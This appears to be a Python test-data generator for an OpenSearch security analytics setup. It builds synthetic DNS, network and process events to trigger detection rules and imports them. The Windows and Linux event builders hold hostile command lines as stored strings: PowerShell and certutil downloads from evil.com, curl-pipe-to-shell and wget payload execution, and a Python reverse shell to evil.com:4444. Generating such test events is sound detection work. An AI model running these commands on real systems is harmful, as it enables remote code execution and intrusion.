#!/usr/bin/env python3
"""
创建能匹配现有规则的测试事件

功能：
1. 查询现有规则的条件
2. 根据规则条件创建匹配的测试事件
3. 确保事件能触发规则匹配
"""

import sys
from pathlib import Path
from datetime import datetime
import random

# 添加 backend 目录到路径
backend_dir = Path(__file__).parent.parent.parent
sys.path.insert(0, str(backend_dir))

from opensearch.internal import get_client
from opensearch import store_events


def get_rules_for_detector(detector_type: str, limit: int = 10):
    """获取detector使用的规则详情"""
    client = get_client()
    
    try:
        # 查询detector
        detector_resp = client.transport.perform_request(
            'POST',
            '/_plugins/_security_analytics/detectors/_search',
            body={
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"detector_type": detector_type}},
                            {"term": {"enabled": True}}
                        ]
                    }
                },
                "size": 1
            }
        )
        
        detector_hits = detector_resp.get('hits', {}).get('hits', [])
        if not detector_hits:
            return []
        
        detector = detector_hits[0].get('_source', {})
        inputs = detector.get('inputs', [])
        if not inputs:
            return []
        
        detector_input = inputs[0].get('detector_input', {})
        prepackaged = detector_input.get('pre_packaged_rules', [])
        custom = detector_input.get('custom_rules', [])
        
        # 查询规则详情
        rules = []
        for rule in (prepackaged + custom)[:limit]:
            rule_id = rule.get('id')
            if rule_id:
                try:
                    rule_resp = client.transport.perform_request(
                        'GET',
                        f'/_plugins/_security_analytics/rules/{rule_id}'
                    )
                    rule_data = rule_resp.get('rule', {})
                    rules.append(rule_data)
                except:
                    pass
        
        return rules
    except Exception as e:
        print(f"❌ 查询规则失败: {e}")
        return []


def analyze_rule_conditions(rules):
    """分析规则条件，提取关键字段"""
    conditions = {
        'dns_domains': set(),
        'process_names': set(),
        'command_patterns': set(),
        'network_patterns': set(),
        'file_paths': set(),
    }
    
    for rule in rules:
        title = rule.get('title', '').lower()
        description = rule.get('description', '').lower()
        
        # 从标题和描述中提取关键词
        if 'dns' in title or 'dns' in description:
            # DNS相关规则
            if 'cobalt' in title or 'cobalt' in description:
                conditions['dns_domains'].add('cobaltstrike.beacon.example.com')
            if 'beacon' in title or 'beacon' in description:
                conditions['dns_domains'].add('aaa.stage.example.com')
                conditions['dns_domains'].add('post.123.example.com')
            if 'suspicious' in title or 'suspicious' in description:
                conditions['dns_domains'].add('suspicious-domain.example.com')
        
        if 'powershell' in title or 'powershell' in description:
            conditions['process_names'].add('powershell.exe')
            conditions['command_patterns'].add('powershell.exe -EncodedCommand')
            conditions['command_patterns'].add('powershell.exe -nop -w hidden')
        
        if 'cmd' in title or 'cmd' in description:
            conditions['process_names'].add('cmd.exe')
            conditions['command_patterns'].add('cmd.exe /c')
        
        if 'network' in title or 'network' in description:
            if 'suspicious' in title or 'suspicious' in description:
                conditions['network_patterns'].add('suspicious')
    
    return conditions


def create_dns_event_matching_rules():
    """创建匹配DNS规则的DNS事件"""
    # 使用常见的可疑DNS域名（Cobalt Strike等）
    suspicious_domains = [
        'aaa.stage.example.com',  # Cobalt Strike DNS Beaconing
        'post.123.example.com',   # Cobalt Strike DNS Beaconing
        'test.stage.123456.com',  # Cobalt Strike DNS Beaconing
        'cobaltstrike.beacon.example.com',  # Cobalt Strike
        'suspicious-domain.example.com',
        'malicious.example.com',
    ]
    
    domain = random.choice(suspicious_domains)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": datetime.now().isoformat(),
        "event": {
            "id": f"dns-event-{datetime.now().timestamp()}",
            "kind": "event",
            "category": ["network"],
            "type": ["connection"],
            "action": "dns_query",
            "dataset": "dns",
        },
        "dns": {
            "question": {
                "name": domain,
                "type": "A"
            },
            "answers": [
                {
                    "data": f"192.168.1.{random.randint(100, 200)}",
                    "type": "A"
                }
            ],
            "response_code": "NOERROR"
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"test-host-{random.randint(1, 5)}"
        },
        "source": {
            "ip": f"10.0.0.{random.randint(1, 255)}",
            "port": random.randint(49152, 65535)
        },
        "destination": {
            "ip": "8.8.8.8",
            "port": 53
        },
        "message": f"DNS query to {domain}"
    }


def create_network_event_matching_rules():
    """创建匹配Network规则的网络事件"""
    # 可疑的网络连接模式
    suspicious_ips = [
        "192.168.1.200",
        "10.0.0.100",
        "172.16.0.50",
    ]
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": datetime.now().isoformat(),
        "event": {
            "id": f"network-event-{datetime.now().timestamp()}",
            "kind": "event",
            "category": ["network"],
            "type": ["connection"],
            "action": "network_connection",
            "dataset": "network",
        },
        "source": {
            "ip": f"192.168.1.{random.randint(10, 50)}",
            "port": random.randint(4444, 5555)  # 可疑端口
        },
        "destination": {
            "ip": random.choice(suspicious_ips),
            "port": random.choice([8080, 443, 80, 4444]),
            "domain": random.choice([
                "suspicious-server.example.com",
                "malicious.example.com",
                "c2.example.com"
            ])
        },
        "network": {
            "protocol": "tcp",
            "transport": "tcp",
            "direction": "outbound"
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"test-host-{random.randint(1, 5)}"
        },
        "message": "Suspicious network connection"
    }


def create_windows_process_event_matching_rules():
    """创建匹配Windows规则的进程事件"""
    # 可疑的PowerShell命令
    suspicious_commands = [
        "powershell.exe -nop -w hidden -c whoami",
        "powershell.exe -EncodedCommand <base64>",
        "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "cmd.exe /c certutil -urlcache -split -f http://evil.com/malware.exe",
        "cmd.exe /c powershell.exe -nop -w hidden",
    ]
    
    command = random.choice(suspicious_commands)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": datetime.now().isoformat(),
        "event": {
            "id": f"windows-process-event-{datetime.now().timestamp()}",
            "kind": "event",
            "category": ["process"],
            "type": ["start"],
            "action": "process_started",
            "dataset": "windows",
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": "powershell.exe" if "powershell" in command.lower() else "cmd.exe",
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in command.lower() else "C:\\Windows\\System32\\cmd.exe",
            "command_line": command,
            "parent": {
                "pid": random.randint(100, 999),
                "name": random.choice(["cmd.exe", "explorer.exe", "svchost.exe"]),
                "executable": f"C:\\Windows\\System32\\{random.choice(['cmd.exe', 'explorer.exe', 'svchost.exe'])}",
                "command_line": random.choice(["cmd.exe", "explorer.exe"])
            }
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"test-host-{random.randint(1, 5)}",
            "os": {
                "family": "windows",
                "name": "Windows",
                "version": "10.0"
            }
        },
        "user": {
            "id": f"S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000, 9999)}",
            "name": random.choice(["testuser", "admin", "user"])
        },
        "message": f"Suspicious process execution: {command[:50]}"
    }


def create_linux_process_event_matching_rules():
    """创建匹配Linux规则的进程事件"""
    # 可疑的Linux命令
    suspicious_commands = [
        "bash -c 'curl http://suspicious-domain.com/malware.sh | sh'",
        "sh -c 'wget http://evil.com/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh'",
        "bash -c 'python -c import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    ]
    
    command = random.choice(suspicious_commands)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": datetime.now().isoformat(),
        "event": {
            "id": f"linux-process-event-{datetime.now().timestamp()}",
            "kind": "event",
            "category": ["process"],
            "type": ["start"],
            "action": "process_started",
            "dataset": "linux",
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": random.choice(["bash", "sh", "python"]),
            "executable": random.choice(["/bin/bash", "/bin/sh", "/usr/bin/python"]),
            "command_line": command,
            "parent": {
                "pid": random.randint(100, 999),
                "name": "sh",
                "executable": "/bin/sh",
                "command_line": "sh"
            }
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"linux-host-{random.randint(1, 5)}",
            "os": {
                "family": "linux",
                "name": "Ubuntu",
                "version": "20.04"
            }
        },
        "user": {
            "id": str(random.randint(1000, 9999)),
            "name": random.choice(["testuser", "root", "user"])
        },
        "message": f"Suspicious Linux command execution: {command[:50]}"
    }


def main():
    """主函数"""
    print("=" * 100)
    print("创建匹配现有规则的测试事件")
    print("=" * 100)
    
    # 创建多种类型的匹配事件
    events = []
    
    print("\n[1] 创建DNS事件（匹配DNS规则）...")
    for _ in range(5):  # 创建5个DNS事件
        events.append(create_dns_event_matching_rules())
    print(f"  ✅ 创建了 {5} 个DNS事件")
    
    print("\n[2] 创建Network事件（匹配Network规则）...")
    for _ in range(3):  # 创建3个Network事件
        events.append(create_network_event_matching_rules())
    print(f"  ✅ 创建了 {3} 个Network事件")
    
    print("\n[3] 创建Windows Process事件（匹配Windows规则）...")
    for _ in range(5):  # 创建5个Windows进程事件
        events.append(create_windows_process_event_matching_rules())
    print(f"  ✅ 创建了 {5} 个Windows进程事件")
    
    print("\n[4] 创建Linux Process事件（匹配Linux规则）...")
    for _ in range(3):  # 创建3个Linux进程事件
        events.append(create_linux_process_event_matching_rules())
    print(f"  ✅ 创建了 {3} 个Linux进程事件")
    
    print(f"\n总共创建了 {len(events)} 个测试事件")
    
    # 显示事件摘要
    print("\n事件摘要:")
    dns_count = sum(1 for e in events if 'dns' in e.get('event', {}).get('dataset', ''))
    network_count = sum(1 for e in events if e.get('event', {}).get('dataset') == 'network')
    windows_count = sum(1 for e in events if e.get('event', {}).get('dataset') == 'windows')
    linux_count = sum(1 for e in events if e.get('event', {}).get('dataset') == 'linux')
    
    print(f"  - DNS事件: {dns_count} 个")
    print(f"  - Network事件: {network_count} 个")
    print(f"  - Windows进程事件: {windows_count} 个")
    print(f"  - Linux进程事件: {linux_count} 个")
    
    # 导入到OpenSearch
    print(f"\n导入到OpenSearch...")
    try:
        result = store_events(events)
        
        print(f"\n导入结果:")
        print(f"  成功: {result.get('success', 0)}")
        print(f"  失败: {result.get('failed', 0)}")
        print(f"  重复: {result.get('duplicated', 0)}")
        
        if result.get('success', 0) > 0:
            print(f"\n✅ 成功导入 {result.get('success')} 个事件")
            print(f"\n现在可以运行检测:")
            print(f"  cd backend/opensearch/scripts")
            print(f"  uv run python test_detection.py --all")
            print(f"\n这些事件应该能匹配到规则并生成findings！")
        else:
            print(f"\n❌ 导入失败")
            return 1
        
        return 0
        
    except Exception as e:
        print(f"\n❌ 导入失败: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
